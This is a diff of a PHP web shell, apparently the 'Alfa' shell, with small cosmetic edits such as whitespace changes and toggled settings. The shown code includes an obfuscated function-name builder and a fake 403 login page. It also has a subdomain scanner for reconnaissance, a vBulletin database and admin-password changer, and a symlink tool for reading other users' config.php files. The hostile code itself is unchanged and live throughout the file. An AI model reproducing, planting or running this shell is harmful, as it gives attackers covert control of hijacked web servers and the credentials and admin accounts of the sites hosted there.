@@ -1,16 +1,13 @@
 <?php
 
-error_reporting(0);
-ini_set('display_errors', 0);
-
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'alfa',
     'password' => 'a6f452ec3293d7fb72c5b677257b20ec',//md5(ehsan)
     'safe_mode' => '0',
     'login_page' => '403',
-    'show_icons' => '1',
+    'show_icons' => '0',
     'post_encryption' => false,
-    'cgi_api' => true,
+    'cgi_api' => false,
 );
 
 $CWppUDJxuf = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
@@ -260,8 +257,7 @@ $GLOBALS['__ALFA_COLOR__'] = array(
 		"Alfa+" => array(
 			"key_color" => "#06ff0f",
 			"multi_selector" => array(
-				".alfa_plus" => "color: {color};font-weight: unset;",
-			)
+				".alfa_plus" => "color: {color};font-weight: unset;",)
 		),
 		"hidden_shell_text" => array(
 			"key_color" => "#FF0C00",
@@ -1732,7 +1728,7 @@ curl_setopt($curl, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.
 curl_setopt($curl, CURLOPT_SSL_VERIFYPEER,0);
 curl_setopt($curl, CURLOPT_SSL_VERIFYHOST,0);
 curl_setopt($curl, CURLOPT_HEADER,0);
-curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER,1);
 curl_setopt($curl, CURLOPT_URL,$url);
 curl_setopt($curl, CURLOPT_USERPWD, $info['username'].':'.$info['password']);
 if($info['mysql'])curl_setopt($curl, CURLOPT_HTTPAUTH, CURLAUTH_ANY);
@@ -2162,7 +2158,7 @@ $url = "http://www.".$url;
 }
 $headers = @get_headers($url, 1);
 $server = $headers['Server'];
-$subs = array('owa.','2tty.','m.','gw.','mx1.','store.','1','2','vb.','news.','download.','video','cpanel.', 'ftp.', 'server1.', 'cdn.', 'cdn2.', 'ns.', 'ns3.', 'mail.', 'webmail.', 'direct.', 'direct-connect.', 'record.', 'ssl.', 'dns.', 'help.', 'blog.', 'irc.', 'forum.', 'dl.', 'my.', 'cp.', 'portal.', 'kb.', 'support.','search.', 'docs.', 'files.', 'accounts.', 'secure.', 'register.', 'apps.', 'beta.', 'demo.', 'smtp.', 'ns2.', 'ns1.', 'server.', 'shop.', 'host.', 'web.', 'cloud.', 'api.', 'exchange.', 'app.', 'vps.', 'owa.', 'sat.', 'bbs.', 'movie.', 'music.', 'art.', 'fusion.', 'maps.', 'forums.', 'acc.', 'cc.', 'dev.', 'ww42.', 'wiki.', 'clients.', 'client.','books.','answers.','service.','groups.','images.','upload.','up.','tube.','users.','admin.','administrator.','private.','design.','whmcs.','wp.','wordpress.','joomla.','vbulletin.','test.','developer.','panel.','contact.');
+$subs= array('owa.','2tty.','m.','gw.','mx1.','store.','1','2','vb.','news.','download.','video','cpanel.', 'ftp.', 'server1.', 'cdn.', 'cdn2.', 'ns.', 'ns3.', 'mail.', 'webmail.', 'direct.', 'direct-connect.', 'record.', 'ssl.', 'dns.', 'help.', 'blog.', 'irc.', 'forum.', 'dl.', 'my.', 'cp.', 'portal.', 'kb.', 'support.','search.', 'docs.', 'files.', 'accounts.', 'secure.', 'register.', 'apps.', 'beta.', 'demo.', 'smtp.', 'ns2.', 'ns1.', 'server.', 'shop.', 'host.', 'web.', 'cloud.', 'api.', 'exchange.', 'app.', 'vps.', 'owa.', 'sat.', 'bbs.', 'movie.', 'music.', 'art.', 'fusion.', 'maps.', 'forums.', 'acc.', 'cc.', 'dev.', 'ww42.', 'wiki.', 'clients.', 'client.','books.','answers.','service.','groups.','images.','upload.','up.','tube.','users.','admin.','administrator.','private.','design.','whmcs.','wp.','wordpress.','joomla.','vbulletin.','test.','developer.','panel.','contact.');
 if(preg_match('/^(https?):\/\/(w{3}|w3)\./i', $url, $matches)){
 if($matches[2] != 'www'){$url = preg_replace('/^(https?):\/\//', '', $url);}else{
 $url = explode($matches[0], $url);
@@ -2354,8 +2350,7 @@ echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0
 					      <tr>
 					         <td>Read</td>
 					         <td><input type='checkbox' name='ur' value='4' onclick='calcperm();'></td>
-					         <td><input type='checkbox' name='gr' value='4' onclick='calcperm();'></td>
-					         <td><input type='checkbox' name='wr' value='4' onclick='calcperm();'></td>
+					         <td><input type='checkbox' name='gr' value='4' onclick='calcperm();'></td><td><input type='checkbox' name='wr' value='4' onclick='calcperm();'></td>
 					      </tr>
 					      <tr>
 					         <td>Write</td>
@@ -3477,8 +3472,7 @@ echo __pre();
 
 echo "<center><center><div class='txtfont_header'>| vBulletin |</div>
 <p><center>".getConfigHtml('vb')."<form onSubmit=\"g('IndexChanger',null,'vb',this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.index.value,this.prefix.value,'>>'); return false;\">
-";
-$table = array('td1' =>
+";$table = array('td1' =>
  array('color' => 'FFFFFF', 'tdName' => 'Mysql Host', 'inputName' => 'dbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
  'td2' =>
  array('color' => 'FFFFFF', 'tdName' => 'Db Name', 'inputName' => 'dbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
@@ -4111,7 +4105,7 @@ $table = array('td1' =>
  'td5' =>
  array('color' => 'FFFFFF', 'tdName' => 'Table Prefix', 'id'=>'db_prefix','inputName' => 'prefix', 'inputValue' => '', 'inputSize' => '50'),
  'td6' =>
- array('color' => 'FF0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
+ array('color' => 'FF0000', 'tdName'=> 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
  'td7' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
@@ -4321,7 +4315,7 @@ AlfaNum(9,10);
 echo __pre().'
 <center><p><div class="txtfont_header">| Symlink File And Directory |</div></p><form onSubmit="g(\'symlink\',null,null,null,null,\'SymFile\',this.file.value,this.symfile.value,this.symlink.value);return false;" method="post">
 <input type="text" name="file" placeholder="Example : /home/user/public_html/config.php" size="60"/><br />
-<input type="text" name="symfile" placeholder="Example : alfa.txt" size="60"/>
+<input type="text"name="symfile" placeholder="Example : alfa.txt" size="60"/>
 <p><input type="submit" value=" " name="symlink" /></p></form></center>';
 $path = $_POST['alfa5'];
 $symname = $_POST['alfa6'];
@@ -5104,8 +5098,7 @@ function _hash($string)
 if(function_exists('sha1'))
 {
 $hash = sha1 ($string);
-}
-else
+}else
 {
 $hash = md5 ($string);
 }
@@ -5446,8 +5439,7 @@ echo __pre().'<center><p>Done -> <b><font color="red">'.$zipfile.'</font> <a sty
 }elseif(class_exists('ZipArchive')){
 	$itsok = false;
 	if(emtpy($file_type)){
-		$file_type = "application/zip";
-	}
+		$file_type = "application/zip";}
 	switch ($file_type) {
 		case 'application/zip':
 			$zip = new ZipArchive;
